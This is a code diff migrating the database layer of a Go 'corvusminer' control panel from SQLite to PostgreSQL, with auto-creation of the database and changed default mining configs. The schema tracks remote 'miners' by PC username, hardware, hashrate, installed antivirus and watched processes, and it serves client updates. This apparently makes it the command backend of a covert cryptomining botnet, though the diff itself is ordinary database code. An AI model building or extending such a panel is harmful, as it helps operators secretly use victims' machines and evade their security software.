@@ -1,12 +1,16 @@
 package database
 
 import (
+	"context"
 	"corvusminer/panel/models"
 	"database/sql"
+	"errors"
 	"fmt"
 	"time"
 
-	_ "github.com/mattn/go-sqlite3"
+	"github.com/jackc/pgx/v5"
+	"github.com/jackc/pgx/v5/pgconn"
+	_ "github.com/jackc/pgx/v5/stdlib"
 )
 
 // DB wraps the sql.DB
@@ -14,20 +18,70 @@ type DB struct {
 	*sql.DB
 }
 
-// InitDB initializes SQLite database and creates tables
-func InitDB(dbPath string) (*DB, error) {
-	sqlDB, err := sql.Open("sqlite3", dbPath)
+func openDatabase(databaseURL string) (*sql.DB, error) {
+	sqlDB, err := sql.Open("pgx", databaseURL)
 	if err != nil {
-		return nil, fmt.Errorf("failed to open database: %w", err)
+		return nil, err
 	}
 
 	if err = sqlDB.Ping(); err != nil {
-		return nil, fmt.Errorf("failed to ping database: %w", err)
+		sqlDB.Close()
+		return nil, err
+	}
+	return sqlDB, nil
+}
+
+func isMissingDatabaseError(err error) bool {
+	var pgErr *pgconn.PgError
+	return errors.As(err, &pgErr) && pgErr.Code == "3D000"
+}
+
+func createDatabase(databaseURL string) error {
+	config, err := pgx.ParseConfig(databaseURL)
+	if err != nil {
+		return fmt.Errorf("failed to parse database URL: %w", err)
+	}
+	if config.Database == "" {
+		return errors.New("database name is required")
+	}
+
+	databaseName := config.Database
+	config.Database = "postgres"
+	connection, err := pgx.ConnectConfig(context.Background(), config)
+	if err != nil {
+		return fmt.Errorf("failed to connect to postgres maintenance database: %w", err)
+	}
+	defer connection.Close(context.Background())
+
+	_, err = connection.Exec(context.Background(), "CREATE DATABASE "+pgx.Identifier{databaseName}.Sanitize())
+	if err != nil {
+		var pgErr *pgconn.PgError
+		if errors.As(err, &pgErr) && pgErr.Code == "42P04" {
+			return nil
+		}
+		return fmt.Errorf("failed to create database %q: %w", databaseName, err)
+	}
+
+	return nil
+}
+
+// InitDB initializes PostgreSQL, creates the database when missing, and creates tables.
+func InitDB(databaseURL string) (*DB, error) {
+	sqlDB, err := openDatabase(databaseURL)
+	if err != nil && isMissingDatabaseError(err) {
+		if err := createDatabase(databaseURL); err != nil {
+			return nil, err
+		}
+		sqlDB, err = openDatabase(databaseURL)
+	}
+	if err != nil {
+		return nil, fmt.Errorf("failed to connect to database: %w", err)
 	}
 
 	db := &DB{sqlDB}
 
 	if err := db.createTables(); err != nil {
+		sqlDB.Close()
 		return nil, fmt.Errorf("failed to create tables: %w", err)
 	}
 
@@ -38,7 +92,7 @@ func InitDB(dbPath string) (*DB, error) {
 func (db *DB) createTables() error {
 	minersTable := `
 	CREATE TABLE IF NOT EXISTS miners (
-		id INTEGER PRIMARY KEY AUTOINCREMENT,
+		id BIGSERIAL PRIMARY KEY,
 		device_hash TEXT NOT NULL UNIQUE,
 		pc_username TEXT NOT NULL,
 		cpu_name TEXT,
@@ -55,7 +109,7 @@ func (db *DB) createTables() error {
 
 	configTable := `
 	CREATE TABLE IF NOT EXISTS config (
-		id INTEGER PRIMARY KEY AUTOINCREMENT,
+		id BIGSERIAL PRIMARY KEY,
 		cpu_config TEXT,
 		gpu_config TEXT,
 		gpu_algo TEXT DEFAULT '',
@@ -67,7 +121,7 @@ func (db *DB) createTables() error {
 
 	usersTable := `
 	CREATE TABLE IF NOT EXISTS users (
-		id INTEGER PRIMARY KEY AUTOINCREMENT,
+		id BIGSERIAL PRIMARY KEY,
 		username TEXT NOT NULL UNIQUE,
 		password_hash TEXT NOT NULL,
 		created_at INTEGER NOT NULL
@@ -75,7 +129,7 @@ func (db *DB) createTables() error {
 
 	updatesTable := `
 	CREATE TABLE IF NOT EXISTS updates (
-		id INTEGER PRIMARY KEY AUTOINCREMENT,
+		id BIGSERIAL PRIMARY KEY,
 		version TEXT NOT NULL UNIQUE,
 		filename TEXT NOT NULL,
 		is_current INTEGER DEFAULT 0,
@@ -88,14 +142,15 @@ func (db *DB) createTables() error {
 		}
 	}
 
-	// Migrate: add watched_processes column if it doesn't exist yet
-	_, _ = db.Exec(`ALTER TABLE config ADD COLUMN watched_processes TEXT DEFAULT ''`)
-
-	// Migrate: add client_version column if it doesn't exist yet (for existing databases)
-	_, _ = db.Exec(`ALTER TABLE miners ADD COLUMN client_version TEXT DEFAULT '2.3.0'`)
-
-	// Migrate old placeholder CPU mining URL to the Corvus pool default
-	_, _ = db.Exec(`UPDATE config SET cpu_config = REPLACE(cpu_config, 'pool.example.com:3333', 'mine.corvusxmr.live:3333') WHERE cpu_config LIKE '%pool.example.com:3333%'`)
+	migrations := []string{
+		`ALTER TABLE config ADD COLUMN IF NOT EXISTS watched_processes TEXT DEFAULT ''`,
+		`ALTER TABLE miners ADD COLUMN IF NOT EXISTS client_version TEXT DEFAULT '2.3.0'`,
+	}
+	for _, migration := range migrations {
+		if _, err := db.Exec(migration); err != nil {
+			return fmt.Errorf("failed to execute migration: %w", err)
+		}
+	}
 
 	// Initialize default config if empty
 	var count int
@@ -104,11 +159,11 @@ func (db *DB) createTables() error {
 	}
 
 	if count == 0 {
-		cpuCfg := `{"mining_url":"mine.corvusxmr.live:3333","wallet":"","password":"x","non_idle_usage":50,"idle_usage":20,"wait_time_idle":300,"use_ssl":0}`
-		gpuCfg := `{"mining_url":"pool.example.com:3333","wallet":"","password":"x","non_idle_usage":80,"idle_usage":30,"wait_time_idle":300,"use_ssl":0}`
+		cpuCfg := `{"mining_url":"pool.example.com:3333","wallet":"","password":"x","non_idle_usage":50,"idle_usage":20,"wait_time_idle":3,"use_ssl":0}`
+		gpuCfg := `{"mining_url":"pool.example.com:3333","wallet":"","password":"x","non_idle_usage":80,"idle_usage":30,"wait_time_idle":3,"use_ssl":0}`
 		_, err := db.Exec(`
 			INSERT INTO config (cpu_config, gpu_config, gpu_algo)
-			VALUES (?, ?, ?)
+			VALUES ($1, $2, $3)
 		`, cpuCfg, gpuCfg, "kawpow")
 		if err != nil {
 			return err
@@ -121,7 +176,10 @@ func (db *DB) createTables() error {
 // GetMiners retrieves all miners
 func (db *DB) GetMiners() ([]models.Miner, error) {
 	rows, err := db.Query(`
-		SELECT id, device_hash, pc_username, cpu_name, gpu_name, cpu_hashrate, gpu_hashrate, antivirus_name, device_uptime_min, client_version, status, last_seen, created_at
+		SELECT id, device_hash, pc_username, cpu_name, gpu_name,
+			CASE WHEN status = 'online' THEN cpu_hashrate ELSE 0 END,
+			CASE WHEN status = 'online' THEN gpu_hashrate ELSE 0 END,
+			antivirus_name, device_uptime_min, client_version, status, last_seen, created_at
 		FROM miners
 		ORDER BY last_seen DESC
 	`)
@@ -148,7 +206,7 @@ func (db *DB) GetMiners() ([]models.Miner, error) {
 func (db *DB) UpsertMiner(report *models.MinerReport) error {
 	_, err := db.Exec(`
 		INSERT INTO miners (device_hash, pc_username, cpu_name, gpu_name, cpu_hashrate, gpu_hashrate, antivirus_name, device_uptime_min, client_version, status, last_seen)
-		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+		VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11)
 		ON CONFLICT(device_hash) DO UPDATE SET
 			pc_username = excluded.pc_username,
 			cpu_name = excluded.cpu_name,
@@ -167,7 +225,7 @@ func (db *DB) UpsertMiner(report *models.MinerReport) error {
 
 // DeleteMiner removes a miner by ID
 func (db *DB) DeleteMiner(id int) error {
-	_, err := db.Exec("DELETE FROM miners WHERE id = ?", id)
+	_, err := db.Exec("DELETE FROM miners WHERE id = $1", id)
 	return err
 }
 
@@ -175,8 +233,8 @@ func (db *DB) DeleteMiner(id int) error {
 func (db *DB) UpdateMinerStatus(id int, status string, cpuHashrate, gpuHashrate float64) error {
 	_, err := db.Exec(`
 		UPDATE miners
-		SET status = ?, cpu_hashrate = ?, gpu_hashrate = ?, last_seen = ?
-		WHERE id = ?
+		SET status = $1, cpu_hashrate = $2, gpu_hashrate = $3, last_seen = $4
+		WHERE id = $5
 	`, status, cpuHashrate, gpuHashrate, time.Now().Unix(), id)
 	return err
 }
@@ -190,7 +248,7 @@ func (db *DB) MarkStaleMinerAsOffline(timeoutMinutes int) error {
 	_, err := db.Exec(`
 		UPDATE miners
 		SET status = 'offline'
-		WHERE status = 'online' AND last_seen < ?
+		WHERE status = 'online' AND last_seen < $1
 	`, cutoffTime)
 
 	return err
@@ -204,7 +262,7 @@ func (db *DB) DeleteStaleMiners(days int) (int64, error) {
 
 	result, err := db.Exec(`
 		DELETE FROM miners
-		WHERE last_seen < ?
+		WHERE last_seen < $1
 	`, cutoffTime)
 
 	if err != nil {
@@ -238,8 +296,8 @@ func (db *DB) GetConfig() (*models.Config, error) {
 func (db *DB) UpdateConfig(cfg models.Config) error {
 	_, err := db.Exec(`
 		UPDATE config
-		SET cpu_config = ?, gpu_config = ?, gpu_algo = ?, enable_cpu = ?, enable_gpu = ?, watched_processes = ?, updated_at = CURRENT_TIMESTAMP
-		WHERE id = ?
+		SET cpu_config = $1, gpu_config = $2, gpu_algo = $3, enable_cpu = $4, enable_gpu = $5, watched_processes = $6, updated_at = CURRENT_TIMESTAMP
+		WHERE id = $7
 	`, cfg.CPUConfig, cfg.GPUConfig, cfg.GPUAlgo, cfg.EnableCPU, cfg.EnableGPU, cfg.WatchedProcesses, cfg.ID)
 	return err
 }
@@ -248,7 +306,7 @@ func (db *DB) UpdateConfig(cfg models.Config) error {
 func (db *DB) CreateUser(username, passwordHash string) error {
 	_, err := db.Exec(`
 		INSERT INTO users (username, password_hash, created_at)
-		VALUES (?, ?, ?)
+		VALUES ($1, $2, $3)
 	`, username, passwordHash, time.Now().Unix())
 	return err
 }
@@ -259,7 +317,7 @@ func (db *DB) GetUserByUsername(username string) (*models.User, error) {
 	err := db.QueryRow(`
 		SELECT id, username, password_hash, created_at
 		FROM users
-		WHERE username = ?
+		WHERE username = $1
 	`, username).Scan(&user.ID, &user.Username, &user.PasswordHash, &user.CreatedAt)
 
 	if err == sql.ErrNoRows {
@@ -293,7 +351,7 @@ func (db *DB) AddUpdate(version, filename string, isCurrent bool) error {
 
 	_, err := db.Exec(`
 		INSERT INTO updates (version, filename, is_current)
-		VALUES (?, ?, ?)
+		VALUES ($1, $2, $3)
 	`, version, filename, currentVal)
 
 	return err
@@ -341,7 +399,7 @@ func (db *DB) SetCurrentUpdate(id int) error {
 		return err
 	}
 
-	_, err = db.Exec(`UPDATE updates SET is_current = 1 WHERE id = ?`, id)
+	_, err = db.Exec(`UPDATE updates SET is_current = 1 WHERE id = $1`, id)
 	return err
 }
 
@@ -378,13 +436,13 @@ func (db *DB) DeleteUpdate(id int) (string, error) {
 	var filename string
 
 	// Get filename first
-	err := db.QueryRow("SELECT filename FROM updates WHERE id = ?", id).Scan(&filename)
+	err := db.QueryRow("SELECT filename FROM updates WHERE id = $1", id).Scan(&filename)
 	if err != nil {
 		return "", err
 	}
 
 	// Delete from database
-	_, err = db.Exec("DELETE FROM updates WHERE id = ?", id)
+	_, err = db.Exec("DELETE FROM updates WHERE id = $1", id)
 	if err != nil {
 		return filename, err
 	}
